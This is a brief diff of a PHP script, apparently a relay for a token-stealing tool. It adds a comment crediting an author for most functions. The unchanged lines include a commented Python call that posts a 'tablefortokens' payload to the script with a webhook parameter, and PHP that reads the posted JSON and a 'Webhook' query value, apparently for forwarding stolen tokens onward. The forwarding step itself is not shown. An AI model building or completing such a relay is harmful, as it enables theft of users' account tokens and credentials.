@@ -1,5 +1,6 @@
 <?php
 //(Python) webhook='webhook';import requests;request.post('link_to_php?Webhook='+webhook, tablefortokens)
+//Mosts functions were made by !fishgang Cyrus (https://github.com/Not-Cryus)
 $json = file_get_contents('php://input');
 $data = json_decode($json, true);
 $webhook = $_GET['Webhook'];
